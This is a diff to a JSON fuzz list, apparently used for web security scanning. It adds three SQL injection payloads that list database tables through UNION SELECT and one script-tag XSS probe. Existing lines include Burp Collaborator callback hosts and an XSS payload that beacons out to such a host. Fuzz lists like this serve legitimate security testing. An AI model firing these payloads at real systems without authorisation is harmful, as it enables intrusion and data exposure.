@@ -1,5 +1,8 @@
 {
   "fuzz_list": [
+    " ' UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables--%20",
+    "1 UNION SELECT 1, table_name, 'jfks' FROM information_schema.tables WHERE 1=1 OR 1=1",
+    " 2010-01-01' UNION SELECT 1, 1, table_name, '2010-01-01' FROM information_schema.tables WHERE 1=1 OR '1'='1",
     "xmnkmas9aeh30fh2qbp2flygj7p2ds1kpbc10q.burpcollaborator.net",
     "uzxhz756nbu0dcuz382zsibdw42zqpeh65xsngc",
     "rh2rdt5gr69",
@@ -129,6 +132,7 @@
     "rdqbff%>vi82d'/\"<ez85o",
     "r}}ah7gi'/\"<eikl1",
     "r%}yeabg'/\"<b736g",
+    "<script>document.title=\"Exploit\";</script>",
     "r&pf8cf2l136avt7auj3iu8dr8czis6kucm0gn6bv=1",
     "r&javascript:/*</script><img/onerror='-/\"/-/ onmouseover=1/-/[`*/[]/[(new(Image)).src=(/;/+/4qvrqhwgella4ml9uit9js2nnet7hz5rwfq2gq5X;.burpcollaborator.net/).replace(/.;/g,[])]//'src=>=1",
     "r&fyox96iw0d=1",
